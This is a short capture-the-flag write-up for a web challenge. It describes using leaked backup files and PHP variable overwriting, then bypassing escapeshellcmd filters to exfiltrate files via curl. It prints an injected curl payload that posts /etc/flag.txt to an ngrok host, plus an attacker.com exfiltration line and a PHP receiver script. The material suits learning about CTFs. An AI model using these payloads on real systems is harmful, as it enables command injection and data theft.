# Reveal Me 

- This one had me going on a brain melt for 50 points 

# My part

- `robots.txt` reveals a backup index.php, in there we can see a call to `export` which is a dangerous function that allows local variable hijacking 

- So to exploit we simply pass in `pass=YOUR_PASSWORD` to the burp request and that will overwrite the local `pass` variable 

- Then the website takes us to a place where we can fetch stuff with curl

`file://etc/passwd` is interesting and is also the unintended way of solving it, unfortunately the author have already blocked it 

`http://34.72.61.239/backup/fetch_url.php.bak`, ooh another .bak file 

- This one shows the filter that we're gonna have to bypass, which is the `preg_match` filter and `escapeshellcmd`

- We can get LFI with `--data-binary password=@/etc/passwd http://attacker.com/`(not using `-F` because it is filterd)and a file like this 

```php
<?php
  file_put_contents('output.txt', file_get_contents($_FILES['password']['tmp_name']));
?>
```

- If we do that with ngrok tho we dont get anything, and if we try to request the specific file, i.e `http://attacker.com/getfile.php` the filter blocks the request and renaming the file to `index.php`doesn't do anything either

- Renaming the file to `index.html` does seem to work on a normal user but still getting nothing 

# NoobHacker's part 

- He did some magic and managed to get a working payload which is 

```
;curl http://7485-122-161-50-122.ngrok.io/temp -X POST --data-binary @/etc/flag.txt
``` 

- Make sure to replace the ngrok url with your own

# Flag - {too lazy to get}